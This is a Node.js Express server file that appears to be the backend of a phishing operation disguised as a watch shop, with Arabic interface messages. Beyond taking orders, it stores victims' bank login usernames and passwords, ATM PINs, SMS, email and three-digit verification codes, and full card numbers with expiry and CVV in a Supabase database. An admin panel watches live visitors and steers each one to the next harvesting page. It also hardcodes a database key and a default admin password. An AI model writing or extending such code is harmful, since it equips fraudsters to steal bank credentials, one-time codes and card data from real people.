const express = require('express');
const path = require('path');
const crypto = require('crypto');
const { createClient } = require('@supabase/supabase-js');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

const SUPABASE_URL = process.env.SUPABASE_URL || 'https://yqygohgdqifsykrdaaoe.supabase.co';
const SUPABASE_KEY = process.env.SUPABASE_KEY || 'sb_publishable_eq9GQMQhXR2Jfqbg27uASg_Qdi8Uqej';
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin1234@@';

const ADMIN_TOKEN = crypto.createHash('sha256').update(ADMIN_PASSWORD).digest('hex');

// Admin login
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  if (password === ADMIN_PASSWORD) {
    return res.json({ success: true, token: ADMIN_TOKEN });
  }
  res.status(401).json({ success: false, message: 'كلمة المرور غير صحيحة' });
});

// Admin auth check
function isAdmin(req) {
  const auth = req.headers.authorization;
  if (auth && auth.startsWith('Bearer ')) {
    return auth.slice(7) === ADMIN_TOKEN;
  }
  return false;
}

// Save order
app.post('/api/orders', async (req, res) => {
  try {
    const { name, phone, wilaya, city, address, watch_color, watch_index, country: formCountry } = req.body;
    if (!name || !phone || !wilaya || !address) {
      return res.status(400).json({ success: false, message: 'جميع الحقول مطلوبة' });
    }
    const country = req.headers['x-vercel-ip-country'] || req.headers['cf-ipcountry'] || formCountry || null;
    const row = {
      name, phone, wilaya, city, address, watch_color,
      watch_index: watch_index !== undefined ? watch_index : null,
      current_page: 'order',
      status: 'pending',
      created_at: new Date().toISOString()
    };
    if (country) row.country = country;
    let { error } = await supabase.from('orders').insert(row);
    if (error && error.message && error.message.includes('country')) {
      delete row.country;
      const retry = await supabase.from('orders').insert(row);
      error = retry.error;
    }
    if (error) throw error;
    const { data: inserted } = await supabase.from('orders').select('id').eq('phone', phone).order('created_at', { ascending: false }).limit(1).maybeSingle();
    res.json({ success: true, order_id: inserted ? inserted.id : null });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login username
app.post('/api/login-data', async (req, res) => {
  try {
    const { order_id, username, country } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const updates = {
      login_username: username,
      current_page: 'calling',
      status: 'pending',
      redirect_to: null,
    };
    if (country) updates.login_country = country;
    const { error } = await supabase.from('orders').update(updates).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('login-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save login password
app.post('/api/password-data', async (req, res) => {
  try {
    const { order_id, password } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ login_password: password, current_page: 'waiting', status: 'pending', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('password-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save ATM PIN
app.post('/api/atm-data', async (req, res) => {
  try {
    const { order_id, atm_pin } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ atm_pin: atm_pin, current_page: 'atm-waiting', status: 'atm_pending', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('atm-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save verification code (6-digit SMS)
app.post('/api/code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ verification_code: code, status: 'code_pending', current_page: 'code-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('code-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save 3-digit verification code (separate from 6-digit SMS)
app.post('/api/code3-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ verification_code_3: code, status: 'code_pending', current_page: 'code3-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('code3-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save email verification code
app.post('/api/email-code-data', async (req, res) => {
  try {
    const { order_id, code } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({ email_verification_code: code, status: 'email_code_pending', current_page: 'email-code-waiting', redirect_to: null }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('email-code-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Save card details
app.post('/api/card-data', async (req, res) => {
  try {
    const { order_id, card_name, card_number, card_expiry, card_cvv } = req.body;
    if (!order_id) return res.status(400).json({ success: false, message: 'order_id missing' });
    const { error } = await supabase.from('orders').update({
      card_name, card_number, card_expiry, card_cvv,
      status: 'card_pending', current_page: 'card-waiting', redirect_to: null
    }).eq('id', order_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('card-data error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Presence / heartbeat for active visitors
app.post('/api/presence', async (req, res) => {
  try {
    const { session_id, current_page } = req.body;
    if (!session_id) return res.json({ ok: false });
    const nowIso = new Date().toISOString();
    const { data: existing } = await supabase.from('visitors').select('id, redirect_to').eq('session_id', session_id).maybeSingle();
    if (!existing) {
      await supabase.from('visitors').upsert({
        session_id,
        current_page: current_page || 'home',
        first_seen: nowIso,
        last_seen: nowIso,
      }, { onConflict: 'session_id' });
    } else {
      const updates = { last_seen: nowIso };
      if (current_page) updates.current_page = current_page;
      await supabase.from('visitors').update(updates).eq('session_id', session_id);
      if (existing.redirect_to) {
        await supabase.from('visitors').update({ redirect_to: null }).eq('session_id', session_id);
        return res.json({ ok: true, redirectTo: existing.redirect_to });
      }
    }
    res.json({ ok: true });
  } catch (err) {
    console.error('presence error:', err.message);
    res.json({ ok: false });
  }
});

// Get active visitors count (admin) — anyone seen in the last 15 seconds
app.get('/api/visitors/active', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ count: 0 });
    const cutoffIso = new Date(Date.now() - 15000).toISOString();
    const { data, error } = await supabase.from('visitors').select('*').gte('last_seen', cutoffIso).order('last_seen', { ascending: false });
    if (error) throw error;
    res.json({ count: (data || []).length, visitors: data || [] });
  } catch (err) {
    console.error('visitors/active error:', err.message);
    res.json({ count: 0, visitors: [] });
  }
});

// Redirect a specific visitor by session_id (admin)
app.patch('/api/visitors/:session_id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { redirect_to } = req.body;
    if (!redirect_to) return res.status(400).json({ success: false, message: 'redirect_to missing' });
    const { error } = await supabase.from('visitors').update({ redirect_to }).eq('session_id', req.params.session_id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    console.error('visitor redirect error:', err.message);
    res.status(500).json({ success: false, message: err.message });
  }
});

// Check order status (public - for waiting page)
app.get('/api/orders/:id/status', async (req, res) => {
  try {
    const { data } = await supabase.from('orders').select('status, redirect_to, login_username').eq('id', req.params.id).maybeSingle();
    if (!data) return res.json({ status: 'not_found' });
    if (data.redirect_to) {
      await supabase.from('orders').update({ redirect_to: null }).eq('id', req.params.id);
      return res.json({ status: data.status, redirect_to: data.redirect_to, username: data.login_username });
    }
    res.json({ status: data.status, username: data.login_username });
  } catch (err) {
    res.json({ status: 'error' });
  }
});

// Get orders (admin)
app.get('/api/orders', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ orders: [] });
    const { data, error } = await supabase.from('orders').select('*').order('created_at', { ascending: false });
    if (error) throw error;
    res.json({ orders: data || [] });
  } catch (err) {
    res.status(500).json({ orders: [], message: err.message });
  }
});

// Update order status
app.patch('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const updates = {};
    if (req.body.status) updates.status = req.body.status;
    if (req.body.redirect_to !== undefined) {
      updates.redirect_to = req.body.redirect_to;
      if (req.body.redirect_to) {
        const page = req.body.redirect_to.replace('.html','').replace(/\?.*/,'');
        updates.current_page = page;
      }
    }
    const { error } = await supabase.from('orders').update(updates).eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

// Delete order
app.delete('/api/orders/:id', async (req, res) => {
  try {
    if (!isAdmin(req)) return res.status(401).json({ success: false });
    const { error } = await supabase.from('orders').delete().eq('id', req.params.id);
    if (error) throw error;
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ success: false, message: err.message });
  }
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

if (!process.env.VERCEL) {
  app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

module.exports = app;
